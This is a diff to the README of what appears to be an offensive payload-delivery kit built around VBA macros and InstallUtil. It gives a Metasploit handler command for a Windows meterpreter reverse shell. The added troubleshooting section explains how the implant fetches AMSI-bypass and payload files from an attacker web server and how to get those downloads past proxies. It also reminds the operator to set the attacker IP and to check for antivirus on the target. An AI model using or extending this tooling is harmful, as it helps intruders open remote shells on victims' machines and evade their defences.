@@ -74,3 +74,23 @@ python3 vbagen.py
 ```bash
 msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <IP>; set LPORT 443; set ExitOnSession false; exploit -j"
 ```
+
+## Troubleshooting
+
+**`GET /amsi.txt 200` followed by an error phone-home to `/err?...`:**
+`Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: An unexpected error occurred on a receive."`
+
+This is a .NET `WebClient` receive failure, not a payload problem. `bitsadmin` (BITS)
+fetches `clm.txt` fine because it uses a different HTTP stack. The .NET `WebClient`
+fails when it routes through a **system proxy** (or negotiates TLS / `Expect: 100-continue`)
+that resets the connection.
+
+The fix is baked into `installutil.cs`:
+- downloads happen in C# with `wc.Proxy = null` (no system proxy),
+- `ServicePointManager.SecurityProtocol` is set to TLS 1.2/1.1/1.0,
+- `ServicePointManager.Expect100Continue = false`.
+
+If it still fails, double-check:
+1. The attacker IP in `installutil.cs` (the fruited `url` array) is your IP.
+2. `run.txt` and `amsi.txt` are actually in `/var/www/html/`.
+3. No host firewall / AV on the target is resetting the connection mid-download.
